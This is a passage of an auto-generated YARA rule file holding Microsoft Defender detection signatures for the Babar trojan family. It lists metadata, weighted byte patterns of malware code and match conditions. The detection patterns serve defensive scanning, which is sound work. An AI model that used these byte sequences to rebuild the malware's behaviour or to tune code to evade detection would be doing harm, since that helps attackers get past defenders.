    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.AB!MTB"
        threat_id = "2147939500"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {50 45 43 6f 6d 70 61 63 74 32 00 16 a4 3a f5 7a a1 68 9d 1c 79 f6 48 4d 51}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_GVB_2147954639_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.GVB!MTB"
        threat_id = "2147954639"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8a 15 4e 40 66 00 8b f0 30 15 43 40 66 00 a0 41 40 66 00 0c 0c c0 e8 02 0f b6 c8 89 4c 24 ?? 57 db 44 24}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_AHB_2147955765_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.AHB!MTB"
        threat_id = "2147955765"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "60"
        strings_accuracy = "Low"
    strings:
        $x_30_1 = {8b f8 8b d8 c1 ef ?? c1 eb ?? 89 45 f8 21 75 f8 89 45 f4 23 fe 23 de c1 6d f4 18}  //weight: 30, accuracy: Low
        $x_10_2 = {89 45 ec 89 7d f0 89 7d e8 89 7d fc 39 79 08 7e}  //weight: 10, accuracy: High
        $x_20_3 = "c:\\log_%s.txt" ascii //weight: 20
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_LM_2147955981_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.LM!MTB"
        threat_id = "2147955981"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "30"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {ba 56 00 00 00 2b 95 5c ff ff ff 89 55 f0 b8 61 00 00 00 2b 45 d8 0b 85 64 ff ff ff 89 85 64 ff ff ff 8b 8d 5c ff ff ff 03 4d d8 03 8d 3c ff ff ff 0f b7 95 40 ff ff ff 2b ca}  //weight: 10, accuracy: High
        $x_20_2 = {8b 8d 64 ff ff ff 83 c1 56 89 8d 5c ff ff ff 0f b7 55 dc 03 55 d8 33 55 d8 33 95 5c ff ff ff 0f b7 45 a4 33 d0 88 55 f7}  //weight: 20, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_Babar_HZN_2147959719_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/Babar.HZN!MTB"
        threat_id = "2147959719"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "Babar"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {83 c1 01 89 4d fc 8b 55 fc 3b 55 0c 73 ?? 8b 45 f8 c1 e8 08 8b 4d f4 03 4d fc 0f b6 11 33 55 f8 81 e2 ff 00 00 00 33 04 95 ?? ?? ?? ?? 89 45 f8 eb}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

